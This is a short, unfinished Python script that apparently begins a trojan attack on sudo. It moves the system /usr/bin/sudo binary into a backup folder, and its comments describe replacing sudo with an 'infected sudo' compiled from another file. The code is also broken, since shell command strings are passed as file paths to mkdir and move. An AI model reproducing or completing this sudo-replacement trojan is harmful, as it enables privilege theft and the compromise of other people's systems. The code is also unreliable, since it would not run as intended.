from shutil import move ; from os import mkdir
bkf = "/usr/bin/sudobk" ; mkdir(f"mkdir {bkf}") ; move("cp /usr/bin/sudo",f"{bkf}")
# | 1. GET SUDO PATH
# | 2. create backup folder for sudo
# | 3. copies the og sudo file into the backup folder

# replace PATH sudo file with infected sudo NOTE: COMPILED VERSION OF *compile-me.py*
# TODO: finish tmr, gn
